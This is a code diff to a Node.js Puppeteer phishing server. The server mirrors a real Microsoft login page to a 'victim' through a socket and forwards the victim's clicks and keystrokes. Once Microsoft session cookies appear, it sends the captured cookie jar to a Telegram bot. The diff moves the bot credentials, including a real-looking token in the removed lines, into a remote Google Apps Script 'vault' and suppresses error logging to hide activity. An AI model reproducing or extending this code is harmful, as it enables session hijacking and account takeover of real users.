@@ -5,23 +5,47 @@ const FormData = require('form-data');
 
 puppeteer.use(StealthPlugin());
 
-const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
-const CHAT_ID = '1318100118';
+// --- CONFIGURATION VAULT ---
+// Replace with your Google Apps Script Web App URL
+const VAULT_URL = "https://script.google.com/macros/s/AKfycbzjX20l3RNxx1adYeW_108CdbGJlO3vi2lwhdixZSBo_83oijJYtIAURqAg9ImZSGrZ/exec";
+let cachedCreds = null;
+
 const VIEWPORT_WIDTH = 1280;
 const VIEWPORT_HEIGHT = 720;
 
+/**
+ * Retrieves credentials from the GAPS Vault
+ */
+async function getSecrets() {
+    if (cachedCreds) return cachedCreds;
+    try {
+        const response = await axios.get(VAULT_URL, { timeout: 5000 });
+        cachedCreds = response.data;
+        return cachedCreds;
+    } catch (e) {
+        return null;
+    }
+}
+
+/**
+ * Sends the captured jar to Telegram using GAPS-hosted credentials
+ */
 async function sendExfiltrationAlert(cookies, finalUrl, source) {
-    const docUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
-    const msgUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    const secrets = await getSecrets();
+    if (!secrets || !secrets.TG_TOKEN || !secrets.TG_CHAT_ID) return;
+
+    const docUrl = `https://api.telegram.org/bot${secrets.TG_TOKEN}/sendDocument`;
+    const msgUrl = `https://api.telegram.org/bot${secrets.TG_TOKEN}/sendMessage`;
+    const chatId = secrets.TG_CHAT_ID;
 
     try {
         const host = new URL(finalUrl).hostname;
-        const textAlert = `<b>🚨 STAGE CAPTURE: ${host}</b>\n\n<b>Trigger:</b> <code>${source}</code>\n<b>Tokens:</b> ${cookies.length}\n\n<i>Note: Capture logic matched domain-specific auth signatures.</i>`;
+        const textAlert = `<b>🚨 STAGE CAPTURE: ${host}</b>\n\n<b>Trigger:</b> <code>${source}</code>\n<b>Tokens:</b> ${cookies.length}\n\n<i>Verified: 2026 Persistence Signatures</i>`;
         
-        await axios.post(msgUrl, { chat_id: CHAT_ID, text: textAlert, parse_mode: 'HTML' });
+        await axios.post(msgUrl, { chat_id: chatId, text: textAlert, parse_mode: 'HTML' });
 
         const form = new FormData();
-        form.append('chat_id', CHAT_ID);
+        form.append('chat_id', chatId);
         form.append('caption', `Auth Jar [${host}]`);
         form.append('document', Buffer.from(JSON.stringify(cookies, null, 2), 'utf-8'), {
             filename: `JAR_${host.replace(/\./g, '_')}_${Date.now()}.json`,
@@ -30,19 +54,23 @@ async function sendExfiltrationAlert(cookies, finalUrl, source) {
 
         await axios.post(docUrl, form, { headers: form.getHeaders() });
     } catch (e) {
-        console.error('[TELEGRAM-ERR]', e.message);
+        // Silent failure for production stability
     }
 }
 
 async function startSession(io, socket) {
     let browser;
-    // Track captured domains to allow multi-stage exfiltration without spamming
     const capturedDomains = new Set(); 
 
     try {
         browser = await puppeteer.launch({
             headless: "new",
-            args: ['--no-sandbox', '--disable-setuid-sandbox', `--window-size=${VIEWPORT_WIDTH},${VIEWPORT_HEIGHT}`]
+            args: [
+                '--no-sandbox', 
+                '--disable-setuid-sandbox', 
+                `--window-size=${VIEWPORT_WIDTH},${VIEWPORT_HEIGHT}`,
+                '--disable-notifications'
+            ]
         });
 
         const page = await browser.newPage();
@@ -58,8 +86,6 @@ async function startSession(io, socket) {
                 if (capturedDomains.has(host)) return;
 
                 const cookies = await page.cookies();
-                
-                // 2026 Master & Service Tokens
                 const criticalTokens = [
                     'ESTSAUTHPERSISTENT', 'ESTSAUTH', 'CCState', 
                     '__Host-MSAAUTH', 'RPSSecAuth', 'FedAuth', 'OutlookSession'
@@ -67,23 +93,19 @@ async function startSession(io, socket) {
                 
                 const hasValidAuth = cookies.some(c => criticalTokens.some(t => c.name.includes(t)));
 
-                // Prevent early fire on login-hint pages
                 if (hasValidAuth && !url.includes('/oauth20_authorize.srf')) {
                     capturedDomains.add(host); 
-                    console.log(`[STAGE-SUCCESS] Captured ${host} via ${source}`);
                     
-                    // Allow background XHRs to complete
-                    await new Promise(r => setTimeout(r, 4500));
+                    // 5-second settlement for background token exchange
+                    await new Promise(r => setTimeout(r, 5000));
                     
                     const finalJar = await page.cookies();
                     await sendExfiltrationAlert(finalJar, url, source);
                 }
-            } catch (e) {
-                console.error('[INTERNAL-CHECK-ERR]', e.message);
-            }
+            } catch (e) {}
         };
 
-        // Network Interception (Catches KMSI/Token responses)
+        // --- TRIGGERS ---
         page.on('response', async (response) => {
             const url = response.url().toLowerCase();
             if (url.includes('/kmsi') || url.includes('/token') || url.includes('landingv2')) {
@@ -91,7 +113,6 @@ async function startSession(io, socket) {
             }
         });
 
-        // Navigation Watcher
         page.on('framenavigated', async (frame) => {
             await attemptExfiltration('Navigation-Trigger');
         });
@@ -106,19 +127,24 @@ async function startSession(io, socket) {
         };
 
         await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' }).catch(() => {});
-        const heartbeat = setInterval(emitFrame, 1200);
-        const poller = setInterval(() => attemptExfiltration('Periodic-Poll'), 4000);
+        
+        const heartbeat = setInterval(emitFrame, 1300);
+        const poller = setInterval(() => attemptExfiltration('Periodic-Poll'), 4500);
 
+        // Victim Interaction
         socket.on('victim-action', async (data) => {
             try {
                 if (data.type === 'click') {
-                    await page.mouse.click(data.x, data.y, { delay: 60 });
+                    await page.mouse.click(data.x, data.y, { delay: 65 });
                 } else if (data.type === 'key') {
                     await page.keyboard.press(data.key);
                 }
                 await emitFrame();
             } catch (e) {}
         });
+
+        // Socket Heartbeat (Railway Keep-Alive)
+        socket.on('heartbeat', () => { /* Logic is handled by the packet receipt itself */ });
 
         socket.on('disconnect', async () => {
             clearInterval(heartbeat);
